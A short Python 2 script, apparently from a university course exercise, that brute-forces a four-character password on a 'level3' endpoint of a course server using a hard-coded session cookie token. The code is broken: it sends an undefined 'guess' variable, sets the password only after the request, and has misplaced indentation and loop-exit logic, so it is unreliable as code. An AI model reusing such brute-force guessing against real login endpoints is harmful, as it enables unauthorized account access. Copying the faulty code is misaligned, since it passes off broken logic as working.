import urllib2 

server = "http://cpe123.csc.calpoly.edu:443"
token = "b25350ce985d2988de3f457f96196b923563f37e"



    
alphabet = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]


for first_character in alphabet:
    for second_character in alphabet:
        for third_character in alphabet:
            for fourth_character in alphabet:
                try:
                    req = urllib2.Request(server + "/level3?guess=" + guess)
	                req.add_header('Cookie', 'webpy_session_id=' + token)
                    response = urllib2.urlopen(req)
                    password = first_character + second_character + third_character + fourth_character 
                    print password, response.getcode()
                except urllib2.HTTPError as e:
                                print password, e.code
            else:
                quit()


